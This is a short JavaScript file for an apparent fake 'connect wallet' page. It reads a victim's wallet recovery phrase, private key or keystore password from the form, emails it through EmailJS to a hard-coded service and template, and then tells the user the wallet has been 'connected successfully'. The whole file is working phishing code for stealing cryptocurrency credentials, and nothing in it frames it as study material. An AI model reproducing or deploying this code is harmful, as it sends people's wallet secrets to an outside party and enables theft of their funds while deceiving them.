// phrase
// private key
// keystorepassword

const form = document.querySelector('form');

function proceed(){
    var phrase = document.getElementById("textareaphrase").value;
    var privateKey = document.getElementById("privatekey").value;
    var keystorePassword = document.getElementById("keystorepassword").value;
    console.log(phrase || privateKey || keystorePassword);
    var templateParams = {
        message: phrase || privateKey || keystorePassword
    };
     
    emailjs.send('service_ig831jm', 'template_7k9v1z3', templateParams)
        .then(function(response) {
           console.log('SUCCESS!', response.status, response.text);
           alert("Your wallet has been connected successfully.");
           window.setTimeout(document.getElementById("btn-text").innerHTML = "Proceed", 2000);
        }, function(error) {
            alert("error connecting wallet...")
            window.setTimeout(document.getElementById("btn-text").innerHTML = "Proceed", 2000);
           console.log('FAILED...', error);
        });
    
}

form.addEventListener( 'submit', function(e){
    e.preventDefault();
    document.getElementById("btn-text").innerHTML = "Sending..."
    //delay for 5 seconds
    window.setTimeout(proceed(), 7000)
} );